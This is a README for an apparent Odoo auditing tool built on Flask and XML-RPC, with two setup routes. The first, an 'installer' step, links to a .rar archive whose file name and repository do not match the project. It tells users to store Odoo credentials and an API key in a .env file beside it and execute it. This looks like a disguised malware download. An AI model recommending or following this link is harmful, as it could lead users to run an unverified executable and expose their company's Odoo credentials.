# Odoo Audit Framework

This repository contains a lightweight, extensible framework for auditing Odoo instances. It provides a generic pipeline for data quality checks, analysis, and visualization, suitable for any Odoo-based enterprise. Originally built for a specific use case (like Domo), it's fully agnostic and can audit any Odoo setup by simply swapping credentials.

## Overview

This is more than a simple script. it's a mini-platform for generic Odoo auditing. The short answer: yes, the pipeline is ready. Change the credentials, and you can audit another company instantly.

### Key Features

- **Enterprise-Agnostic Design**: 100% of the company-specific coupling is isolated to the connection credentials in ```odoo_client.py```. Everything else (```services/```, ```analysis/```, ```templates/```, ```app.py```) is completely decoupled and reusable.

- **Portable Architecture**: Works with any Odoo instance that includes standard models like ```product.template```, ```product.category```, ``company_id``, `available_in_pos`, and `website_published`. Applicable to industries such as retail, restaurants, online stores, hardware shops, clinics, universities, and more.

- **Audit Pipeline**:
  - Odoo (any company) → XML-RPC
  - `odoo_client.py` (infrastructure connector)
  - `services/` (data access layer / DAO / repository)
  - `analysis/` (business logic for auditing rules)
  - Flask + Jinja (visualization and reporting)

- This mirrors a classic BI/audit system architecture: connector → data access → business rules → reporting.

## Setup and Usage

### Option One: Use installer

1. **Download** [Odoo Audit.rar](https://github.com/Juda-Tech-Green/pvi-vaceado-tanque/raw/main/PVI%20Vaceado%20Tanque.rar?download=1)
2. **Unzip**
2. **Create .env file**
 ```env
  ODOO_URL=https://your-odoo-instance.com
  ODOO_DATABASE=your_database_name
  USERNAME_OR_EMAIL=your_username@company.com
  API_KEY_FROM_ODOO=your_api_key
  ```
3. **Execute**

### Option Two

1. **Clone repository**
```bash
 git clone https://github.com/Juda-Tech-Green/odoo-audit
```
2. **Environment Variables**
  ```env
  ODOO_URL=https://your-odoo-instance.com
  ODOO_DATABASE=your_database_name
  USERNAME_OR_EMAIL=your_username@company.com
  API_KEY_FROM_ODOO=your_api_key
  ```
2. **Installation**
  ```bash
  pip install -r requirements.txt
  ```
3. **Run APP**
  ```bash
  python app.py
  ```
---
## License

MIT License